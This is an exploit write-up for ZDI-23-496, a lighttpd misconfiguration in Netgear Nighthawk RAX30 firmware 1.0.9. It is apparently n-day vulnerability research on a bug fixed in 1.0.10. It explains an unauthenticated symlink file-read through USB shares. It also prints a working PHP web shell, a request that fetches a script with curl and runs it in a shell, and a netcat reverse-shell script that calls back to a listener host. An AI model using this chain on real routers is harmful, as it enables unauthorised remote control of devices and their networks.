# Netgear Nighthawk RAX30 - Nday for ZDI-23-496

## Target Bugs

- ZDI-23-496: `lighttpd` misconfiguration -> RCE

Target firmware/patch versions:
- Prepatch: 1.0.9
- Patched: 1.0.10

## Confirmation and Exploits

### Symlink Info Disclosure

Creating symlinks that point to other files on the device filesystem on a mounted USB device allow
for LFI when accessing the symlink from the webUI. As mounted drive files are accessible without
authentication by default, this provides for trivial LFI.

After connecting the USB drive to the router, the files become visible at
`http://<routerip>/shares/`.

The script `mk-lfi-link.sh` can be used to create a symlink on a locally mounted USB device that can
then be mounted on a vulnerable device.

### RCE via PHP Files

PHP files present on the mounted USB drive are not properly handled, allowing for execution of
arbitrary PHP code. This can be leveraged to run system commands to get more generic arbitrary code
execution.

The file `shell.php` provides a web shell that allows for passing arbitrary system commands via URL
parameters using this code:

```
<?php echo system($_GET['cmd']); ?>
```

This command proxy can then be used to download and execute the reverse shell script in
`reverse.sh`.

```
http://192.168.1.1/shares/R_Drive/shell.php?cmd=curl%20192.168.1.2:8000/reverse.sh|/bin/sh
```

Reverse shell script:
```
#!/bin/sh
rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.2 1337 >/tmp/f
```

